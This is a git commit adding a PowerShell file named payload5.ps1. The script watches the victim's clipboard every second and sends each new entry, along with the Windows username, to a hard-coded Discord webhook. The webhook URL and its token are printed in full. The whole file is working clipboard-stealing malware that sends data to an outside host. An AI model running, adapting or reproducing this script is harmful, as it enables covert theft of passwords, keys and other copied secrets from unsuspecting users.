78b88b276e96806b3cc33bc10ec1d185b9115736
BrianJ-4 <84641264+BrianJ-4@users.noreply.github.com>
2023-10-30 19:36:02 -0700

    Create payload5.ps1

---
+++ payload5.ps1
@@ -0,0 +1,22 @@
+#Yes I know this url shouldn't be publicly displayed
+$webhookUrl  = 'https://discord.com/api/webhooks/1168730851631190066/poAU86kAE69lPvlRvhu6kWwsZZPWUwZcQ7uCfLcDD1OcCvdNrZ9kP_SLAmxwCOFragvF'
+$PreviousClipboard = ""
+while($true)
+{
+	start-sleep -seconds 1
+	$currentClipboard = get-clipboard | Out-String
+    	$currentClipboard = $currentClipboard.Trim()
+
+	if ($currentClipboard -ne $PreviousClipboard) 
+    	{
+        	Write-Host "Change Detected"
+		$PreviousClipboard = $currentClipboard
+
+		#Discord webhook send code from I-Am-Jakoby
+		$Body = @{
+  			'username' = $env:username
+  			'content' = $currentClipboard
+		}
+		Invoke-RestMethod -ContentType 'Application/Json' -Uri $webhookUrl  -Method Post -Body ($Body | ConvertTo-Json)};
+	}	
+}
